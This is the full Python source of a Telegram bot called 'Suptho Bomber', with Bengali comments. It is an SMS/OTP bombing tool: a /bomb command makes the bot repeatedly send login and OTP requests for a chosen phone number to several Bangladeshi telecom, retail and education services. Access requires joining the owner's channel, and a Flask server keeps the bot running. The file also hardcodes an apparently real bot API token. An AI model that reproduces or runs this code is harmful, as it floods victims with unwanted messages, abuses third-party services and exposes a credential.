import telebot
import requests
import threading
import time
import sys
import os
from flask import Flask
from telebot import types

# ==========================================
# 🌐 WEB SERVER (For Render)
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "Bot is Running Successfully!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAHZVqL_RxVGZ9eSlMoOheYtR2JDZtRsHiM'  # <--- টোকেন বসান
OWNER_NAME = "Suptho Hpd"
OWNER_USERNAME = "@Suptho1_"
CHANNEL_ID = "@SH_tricks"         
VERSION = "6.0 (Most Powerful)"

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 🛡️ FORCE JOIN CHECKER
# ==========================================
def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ==========================================
# 🌐 API ENGINE (All 27+ APIs)
# ==========================================
def api_hit(url, method, data=None, json=None, headers=None):
    try:
        head = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"}
        if headers: head.update(headers)
        if method == "POST":
            requests.post(url, data=data, json=json, headers=head, timeout=4)
        else:
            requests.get(url, headers=head, timeout=4)
    except: pass

def attack_all_apis(target):
    # আপনার সব APIs এখানে যোগ করা আছে
    api_hit("https://api.apex4u.com/api/auth/login", "POST", json={"phoneNumber": target})
    api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target})
    api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
    api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json={"mobile": target})
    api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target})
    api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json={"phone": target})
    api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json={"phone": "88"+target})
    api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json={"msisdn": target})
    api_hit("https://app.eonbazar.com/api/auth/register", "POST", json={"mobile": target})
    # ... বাকি APIs আপনার আগের কোড থেকে নিয়ে নিবেন ...

# ==========================================
# 💣 ATTACK MANAGER
# ==========================================
def start_attack(chat_id, target, amount):
    msg = bot.send_message(chat_id, "⚡ **System Initializing...**", parse_mode='Markdown')
    time.sleep(1)
    
    bot.edit_message_text(f"🚀 **Attack Launched!**\n\n🎯 Target: `{target}`\n💣 Amount: `{amount}`\n☠️ Status: **Bombing...**", chat_id, msg.message_id, parse_mode='Markdown')
    
    sent = 0
    for i in range(amount):
        threading.Thread(target=attack_all_apis, args=(target,)).start()
        sent += 1
        if sent % 5 == 0:
            try:
                bot.edit_message_text(f"💣 **Bombing...**\n🎯 Target: `{target}`\n🔥 Sent: {sent}/{amount}", chat_id, msg.message_id, parse_mode='Markdown')
            except: pass
        time.sleep(1)

    bot.edit_message_text(f"✅ **Mission Completed!**\n🎯 Target: `{target}`\n🔥 Total: {sent}\n👑 **Power By: {OWNER_NAME}**", chat_id, msg.message_id, parse_mode='Markdown')

# ==========================================
# 🤖 BOT COMMANDS (BUTTON UI)
# ==========================================

@bot.message_handler(commands=['start'])
def welcome(message):
    # বাটন মেনু তৈরি
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn_bomb = types.InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")
    btn_channel = types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/SH_tricks")
    btn_owner = types.InlineKeyboardButton("👑 Owner", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}")
    btn_about = types.InlineKeyboardButton("ℹ️ About Bot", callback_data="about_bot")
    
    markup.add(btn_bomb)
    markup.add(btn_channel, btn_owner)
    markup.add(btn_about)

    text = f"""
🔥 **WELCOME TO SUPTHO BOMBER** 🔥
───────────────────────
👋 হ্যালো **{message.from_user.first_name}**,

আপনার পছন্দের অপশনটি নিচের বাটন থেকে সিলেক্ট করুন।

📢 আমাদের চ্যানেল: **@SH_tricks**
    """
    bot.send_message(message.chat.id, text, parse_mode='Markdown', reply_markup=markup)

# বাটন ক্লিক হ্যান্ডলার
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "start_bomb":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "💡 **বোম্বিং শুরু করতে এইভাবে কমান্ড দিন:**\n\n`/bomb 017xxxxxxxx 50`", parse_mode='Markdown')
    
    elif call.data == "about_bot":
        bot.answer_callback_query(call.id)
        about_text = f"🤖 **Bot Name:** Suptho Bomber\n📊 **Version:** {VERSION}\n🛠️ **Status:** Running\n💎 **Type:** VIP"
        bot.send_message(call.message.chat.id, about_text, parse_mode='Markdown')

@bot.message_handler(commands=['bomb'])
def handle_bomb(message):
    user_id = message.from_user.id
    
    # জয়েন চেক
    if not is_user_joined(user_id):
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("Join Channel 📢", url="https://t.me/SH_tricks")
        markup.add(btn)
        bot.reply_to(message, "❌ **Access Denied!**\nপ্রথমে আমাদের চ্যানেলে জয়েন করুন।", reply_markup=markup)
        return

    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "❌ **ভুল ফরম্যাট!**\nব্যবহার করুন: `/bomb 017xxxxxxxx 20`", parse_mode='Markdown')
            return
            
        target = parts[1]
        amount = int(parts[2])
        
        if len(target) != 11:
            bot.reply_to(message, "⚠️ সঠিক ১১ ডিজিটের নাম্বার দিন।")
            return
        if amount > 100:
            bot.reply_to(message, "⚠️ আপাতত সর্বোচ্চ লিমিট ১০০।")
            return

        threading.Thread(target=start_attack, args=(message.chat.id, target, amount)).start()
        
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {e}")

# ==========================================
# 🔥 WEBHOOK REMOVE & RUNNER
# ==========================================
if __name__ == "__main__":
    try: bot.remove_webhook()
    except: pass
    
    keep_alive()
    print(f"✅ Bot UI System Started...")

    while True:
        try:
            bot.polling(non_stop=True, interval=1, timeout=20)
        except Exception as e:
            time.sleep(5)
